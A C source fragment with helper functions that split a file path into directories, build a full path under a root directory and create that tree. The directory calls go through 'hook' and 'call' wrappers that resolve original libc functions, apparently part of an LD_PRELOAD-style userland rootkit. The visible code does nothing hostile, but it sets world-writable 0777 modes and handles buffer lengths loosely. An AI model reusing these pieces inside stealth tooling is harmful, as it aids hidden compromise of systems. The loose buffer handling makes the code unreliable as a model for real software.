char **getdirstructure(const char *path, int *cdir){
    char *p, *dup, **dirs;
    size_t namesize;
    int c=0;

    dirs = malloc(sizeof(char*)*MAXDIR);
    if(!dirs) return NULL;

    dup = strdup(path), p = strtok(dup, "/");
    while(p != NULL){
        namesize = strlen(p)+1;
        dirs[c] = malloc(namesize);
        memset(dirs[c], 0, namesize);
        strncpy(dirs[c++], p, namesize);
        p = strtok(NULL, "/");
    }
    free(dup);

    *cdir=c;
    return dirs;
}

char *createdirstructure(const char *rootdir, const char *path, char **dirs, int cdir){
    char *ret, fullpath[strlen(path)+PATH_MAX], *pathdup, *filename;
    size_t tmpsize, buflen=0, pathsize;

    memset(fullpath, 0, sizeof(fullpath));
    strcat(fullpath, rootdir);
    buflen += strlen(rootdir)+1;
    for(int i=0; i<cdir-1; i++){
        tmpsize = strlen(dirs[i])+2;
        buflen += tmpsize-1;

        if(tmpsize+buflen >= sizeof(fullpath)-1)
            break;

        char tmp[tmpsize];
        snprintf(tmp, tmpsize, "/%s/", dirs[i]);
        strcat(fullpath, tmp); 
    }
    fullpath[buflen-1]='/';

    pathdup = strdup(path);
    filename = basename(pathdup);
    if(filename[0] == '.') filename++;
    strcat(fullpath, filename);
    fullpath[buflen+strlen(filename)]='\0';
    free(pathdup);

    pathsize = strlen(fullpath)+1;
    ret = malloc(pathsize);
    if(!ret) return NULL;
    memset(ret, 0, pathsize);
    strncpy(ret, fullpath, pathsize);
    return ret;
}

int mkdirstructure(const char *rootdir, char **dirs, int cdir){
    DIR *dp;
    hook(COPENDIR, CMKDIR);
    dp = call(COPENDIR, rootdir);
    if(dp == NULL && errno == ENOENT){
        if((long)call(CMKDIR, rootdir, 0777) < 0 && errno != EEXIST)
            return -1;
        return mkdirstructure(rootdir, dirs, cdir);
    }else if(dp == NULL) return -1;
    else if(dp) closedir(dp);

    char current[PATH_MAX];
    memset(current, 0, sizeof(current));
    strcat(current, rootdir);
    current[strlen(rootdir)] = '/';

    for(int i=0; i<cdir; i++){
        char tmp[strlen(dirs[i])+2];
        snprintf(tmp, sizeof(tmp), "%s/", dirs[i]);
        strcat(current, tmp);
        if((long)call(CMKDIR, current, 0777) < 0 && errno != EEXIST)
            return -1;
    }

    return 1;
}